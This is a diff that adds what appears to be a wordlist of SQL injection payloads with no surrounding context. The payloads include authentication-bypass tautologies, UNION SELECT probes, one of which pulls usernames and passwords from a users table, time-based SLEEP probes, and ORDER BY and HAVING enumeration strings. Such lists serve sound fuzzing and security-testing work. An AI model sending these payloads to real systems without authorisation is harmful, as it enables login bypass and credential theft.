@@ -1,0 +1,23 @@
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'/*
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+1' AND '1'='1
+1' AND '1'='2
+' AND SLEEP(5)--
+' OR SLEEP(5)--
+admin'--
+admin' #
+' OR ''='
+1; SELECT * FROM users
+' UNION SELECT username,password FROM users--
+SELECT * FROM users WHERE 1=1
+1 OR 1=1--
+' OR ''='
+1' ORDER BY 1--
+1' ORDER BY 2--
+' GROUP BY username--
+' HAVING 1=1--
+' HAVING 1=2--
